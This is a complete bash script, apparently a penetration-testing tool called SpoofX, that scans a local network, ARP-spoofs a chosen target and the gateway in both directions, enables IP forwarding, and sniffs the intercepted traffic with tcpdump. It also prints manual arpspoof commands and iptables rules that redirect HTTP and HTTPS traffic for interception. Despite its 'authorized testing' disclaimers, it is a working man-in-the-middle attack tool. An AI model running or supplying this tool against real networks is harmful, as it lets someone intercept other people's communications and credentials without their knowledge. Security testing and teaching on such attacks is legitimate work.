#!/bin/bash

RED='\033[1;31m'; GREEN='\033[1;32m'; CYAN='\033[1;36m'; YELLOW='\033[1;33m'; RESET='\033[0m'
LOG="spoofx_log_$(date +%Y%m%d_%H%M%S).txt"

show_help() {
    echo -e "${RED}╔══════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}║           SPOOFX v1.0 - HELP                ║${RESET}"
    echo -e "${RED}╚══════════════════════════════════════════════╝${RESET}"
    echo -e "${CYAN}ARP Spoofing & MITM Packet Sniffer${RESET}"
    echo ""
    echo -e "${YELLOW}Usage:${RESET}"
    echo "  ./spoofx.sh                     Interactive menu"
    echo "  ./spoofx.sh -h                  Show help"
    echo ""
    echo -e "${YELLOW}Options:${RESET}"
    echo "  1) ARP Scan Network  - Discover live hosts on subnet"
    echo "  2) ARP Spoof Target  - MITM between target and gateway"
    echo "  3) Sniff Traffic     - Capture packets on interface"
    echo "  4) Restore ARP       - Reset ARP tables to normal"
    echo ""
    echo -e "${RED}DISCLAIMER: Use at your own risk. Developer(s) assume NO liability.${RESET}"
    echo "For authorized testing only on networks you own or have written permission."
}

show_banner() {
    clear 2>/dev/null || echo ""
    echo -e "${RED}╔══════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}║              SPOOFX v1.0                    ║${RESET}"
    echo -e "${RED}║      ARP Spoofing & MITM Sniffer             ║${RESET}"
    echo -e "${RED}╚══════════════════════════════════════════════╝${RESET}"
    echo -e "${YELLOW}       Use at your own risk!${RESET}"
    echo ""
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Root privileges required${RESET}"
        echo -e "${YELLOW}[!] Run: sudo ./spoofx.sh${RESET}"
        exit 1
    fi
}

get_iface() {
    ip route get 1 2>/dev/null | awk '{print $5; exit}'
}

get_subnet() {
    local iface
    iface=$(get_iface)
    if [ -z "$iface" ]; then
        echo "192.168.1.0/24"
        return
    fi
    ip -4 addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | head -1
}

arp_scan() {
    local subnet
    local default_subnet
    default_subnet=$(get_subnet)
    echo -ne "${CYAN}Subnet [${default_subnet}]: ${RESET}"
    read subnet
    [ -z "$subnet" ] && subnet="$default_subnet"
    echo -e "${CYAN}[*] Scanning ${subnet}...${RESET}" | tee -a "$LOG"

    if command -v arp-scan &>/dev/null; then
        arp-scan "$subnet" 2>/dev/null | tee -a "$LOG"
    elif command -v arping &>/dev/null; then
        local base
        base=$(echo "$subnet" | sed 's/\.[0-9]*\/.*//;s/\.0$//')
        echo -e "${YELLOW}[*] Using arping sweep (slow)...${RESET}" | tee -a "$LOG"
        for i in $(seq 1 254); do
            arping -c 1 -w 1 "${base}.${i}" 2>/dev/null &
        done
        wait
        echo -e "${YELLOW}[i] Check with: arp -a${RESET}" | tee -a "$LOG"
        arp -a 2>/dev/null | tee -a "$LOG"
    else
        echo -e "${YELLOW}[!] No ARP scanner. Using ping sweep...${RESET}" | tee -a "$LOG"
        local base
        base=$(echo "$subnet" | sed 's/\.[0-9]*\/.*//;s/\.0$//')
        for i in $(seq 1 254); do
            ping -c 1 -W 1 "${base}.${i}" 2>/dev/null &
        done
        wait
        echo -e "${YELLOW}[i] Live hosts (from ARP cache):${RESET}" | tee -a "$LOG"
        arp -a 2>/dev/null | tee -a "$LOG"
        echo -e "${YELLOW}[i] Install arp-scan: apt install arp-scan${RESET}" | tee -a "$LOG"
    fi
    echo -e "${GREEN}[✓] Scan complete${RESET}" | tee -a "$LOG"
}

arp_spoof() {
    echo -ne "${CYAN}Target IP: ${RESET}"
    read target
    echo -ne "${CYAN}Gateway IP: ${RESET}"
    read gateway

    echo -e "${RED}[!] Starting ARP spoof...${RESET}" | tee -a "$LOG"
    echo "" >> "$LOG"

    if command -v arpspoof &>/dev/null; then
        local iface
        iface=$(get_iface)
        echo -e "${CYAN}[*] Enabling IP forwarding...${RESET}"
        echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
        echo -e "${GREEN}[✓] IP forwarding enabled${RESET}" | tee -a "$LOG"
        echo -e "${CYAN}[*] Spoofing target ${target} -> gateway ${gateway}${RESET}" | tee -a "$LOG"
        echo -e "${CYAN}[*] Spoofing gateway ${gateway} -> target ${target}${RESET}" | tee -a "$LOG"
        arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
        arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
        sleep 2
        echo -e "${GREEN}[✓] ARP spoofing active (Ctrl+C to stop)${RESET}" | tee -a "$LOG"
        echo -e "${YELLOW}[i] Now run option 3 to sniff traffic, or use tcpdump in another terminal${RESET}" | tee -a "$LOG"
    else
        echo -e "${YELLOW}[!] arpspoof not found. Manual commands:${RESET}" | tee -a "$LOG"
        echo "" >> "$LOG"
        echo "1) Enable IP forwarding:" | tee -a "$LOG"
        echo "   echo 1 > /proc/sys/net/ipv4/ip_forward" | tee -a "$LOG"
        echo "" >> "$LOG"
        echo "2) Spoof target (tell target we are gateway):" | tee -a "$LOG"
        echo "   arpspoof -i eth0 -t ${target} ${gateway}" | tee -a "$LOG"
        echo "" >> "$LOG"
        echo "3) Spoof gateway (tell gateway we are target):" | tee -a "$LOG"
        echo "   arpspoof -i eth0 -t ${gateway} ${target}" | tee -a "$LOG"
        echo "" >> "$LOG"
        echo "4) Or use iptables for traffic forwarding:" | tee -a "$LOG"
        echo "   iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080" | tee -a "$LOG"
        echo "   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080" | tee -a "$LOG"
        echo "" >> "$LOG"
        echo -e "${YELLOW}[!] Install arpspoof: apt install dsniff${RESET}" | tee -a "$LOG"
    fi
}

sniff_traffic() {
    if command -v tcpdump &>/dev/null; then
        local iface
        iface=$(get_iface)
        echo -ne "${CYAN}Interface [${iface}]: ${RESET}"
        read input_iface
        [ -n "$input_iface" ] && iface="$input_iface"
        echo -ne "${CYAN}Filter (e.g. 'port 80' or 'host 192.168.1.5' or empty): ${RESET}"
        read filter
        echo -e "${CYAN}[*] Sniffing on ${iface} (Ctrl+C to stop)...${RESET}" | tee -a "$LOG"
        if [ -n "$filter" ]; then
            tcpdump -i "$iface" -nn "$filter" 2>/dev/null | tee -a "$LOG"
        else
            tcpdump -i "$iface" -nn 2>/dev/null | tee -a "$LOG"
        fi
    else
        echo -e "${YELLOW}[!] tcpdump not found. Manual commands:${RESET}" | tee -a "$LOG"
        echo "  # Install: apt install tcpdump" | tee -a "$LOG"
        echo "  # Sniff all traffic:" | tee -a "$LOG"
        echo "  tcpdump -i eth0 -nn" | tee -a "$LOG"
        echo "  # Sniff HTTP:" | tee -a "$LOG"
        echo "  tcpdump -i eth0 -nn port 80" | tee -a "$LOG"
        echo "  # Show packet data:" | tee -a "$LOG"
        echo "  tcpdump -i eth0 -X" | tee -a "$LOG"
    fi
}

restore_arp() {
    echo -e "${CYAN}[*] Restoring ARP tables...${RESET}" | tee -a "$LOG"

    pkill arpspoof 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    echo -e "${GREEN}[✓] Stopped ARP spoofing${RESET}" | tee -a "$LOG"

    echo -e "${GREEN}[✓] ARP cleanup done. Run: ip neigh flush all${RESET}" | tee -a "$LOG"
}

main_menu() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════╗${RESET}"
        echo -e "${RED}║  EDUCATIONAL USE ONLY - Authorized Testing  ║${RESET}"
        echo -e "${RED}╚══════════════════════════════════════════════╝${RESET}"
        echo ""
        echo -e "${CYAN}Select option:${RESET}"
        echo "  1) ARP Scan Network"
        echo "  2) ARP Spoof Target"
        echo "  3) Sniff Traffic"
        echo "  4) Restore ARP"
        echo "  5) Help"
        echo "  6) Exit"
        echo ""
        echo -ne "${GREEN}┌─[${RESET}${RED}SpoofX${RESET}${GREEN}]─[${RESET}${YELLOW}Menu${RESET}${GREEN}]${RESET}"
        echo -ne $'\n└──╼ '
        read opt

        case $opt in
            1) arp_scan ;;
            2) arp_spoof ;;
            3) sniff_traffic ;;
            4) restore_arp ;;
            5) show_help ;;
            6) echo -e "${GREEN}[✓] Exiting SpoofX${RESET}"; exit 0 ;;
            *) echo -e "${RED}[!] Invalid option${RESET}"; sleep 1; continue ;;
        esac
        echo -e "${YELLOW}[i] Log: ${LOG}${RESET}"
        echo -e "${CYAN}Press Enter to continue...${RESET}"; read
    done
}

main() {
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then show_help; exit 0; fi
    show_banner
    check_root
    main_menu
}

main "$@"
